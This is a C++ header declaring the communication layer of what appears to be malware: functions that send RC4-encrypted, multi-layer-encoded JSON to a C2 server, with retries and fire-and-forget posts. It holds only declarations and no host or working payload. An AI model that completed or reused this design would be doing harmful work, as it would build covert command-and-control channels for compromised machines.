#pragma once

#include "json.hpp"
#include <string>

using json = nlohmann::json;

namespace Core {
namespace Communication {

    /**
     * Send a raw HTTP POST request to the C2 server
     * @param jsonBody JSON body to send
     * @param response Output parameter for server response
     * @return true if request successful, false otherwise
     */
    bool HttpPost(const std::string& jsonBody, std::string& response);

    /**
     * Send HTTP POST with retry logic
     * @param jsonBody JSON body to send
     * @param response Output parameter for server response
     * @return true if request successful after retries
     */
    bool SendHttpPost(const std::string& jsonBody, std::string& response);

    /**
     * RC4 encrypt/decrypt data (symmetric operation)
     * @param input Data to encrypt/decrypt
     * @param key Encryption key
     * @return Encrypted/decrypted data
     */
    std::string Rc4Encrypt(const std::string& input, const std::string& key);

    /**
     * RC4 decrypt data (alias for Rc4Encrypt since RC4 is symmetric)
     * @param input Data to decrypt
     * @param key Decryption key
     * @return Decrypted data
     */
    inline std::string Rc4Decrypt(const std::string& input, const std::string& key) {
        return Rc4Encrypt(input, key);
    }

    /**
     * Send an encrypted request to the C2 server and get decrypted response
     * Handles the full encryption/decryption cycle with multiple encoding layers
     * @param innerPayload JSON payload to encrypt and send
     * @param outUnwrappedResponse Output parameter for decrypted response
     * @return true if successful, false on transport or parsing error
     */
    bool SendEncryptedRequest(const json& innerPayload, json& outUnwrappedResponse);

    /**
     * Send an encrypted request without waiting for or processing the response
     * Fire-and-forget operation for one-way communication
     * @param innerPayload JSON payload to encrypt and send
     * @return true if sent successfully, false otherwise
     */
    bool PostEncryptedFireAndForget(const json& innerPayload);

    /**
     * Initialize the communication subsystem
     * Sets up any required network libraries or configurations
     * @return true if initialization successful
     */
    bool Initialize();

    /**
     * Cleanup the communication subsystem
     * Releases any network resources
     */
    void Cleanup();

} // namespace Communication
} // namespace Core